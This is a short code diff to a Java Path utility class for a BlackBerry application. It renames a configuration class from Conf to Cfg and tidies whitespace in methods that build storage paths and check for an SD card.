@@ -18,7 +18,7 @@ import javax.microedition.io.file.FileConnection;
 import javax.microedition.io.file.FileSystemRegistry;
 
 import net.rim.device.api.system.RuntimeStore;
-import blackberry.config.Conf;
+import blackberry.config.Cfg;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -55,7 +55,6 @@ public final class Path {
 
     /** The Constant MARKUP_DIR. */
     public static final String UPLOAD_DIR = "";
-
 
     //public static final String LOG_PATH = SD_PATH;
     //#ifdef DEBUG
@@ -125,7 +124,7 @@ public final class Path {
     }
 
     public static String debug() {
-        return hidden() + DEBUG_DIR ;
+        return hidden() + DEBUG_DIR;
     }
 
     /**
@@ -237,7 +236,7 @@ public final class Path {
      */
     public static boolean isSDAvailable() {
 
-        if (Conf.SD_ENABLED) {
+        if (Cfg.SD_ENABLED) {
             final Enumeration roots = FileSystemRegistry.listRoots();
 
             while (roots.hasMoreElements()) {
@@ -480,6 +479,5 @@ public final class Path {
 
         return 0;
     }
-
 
 }
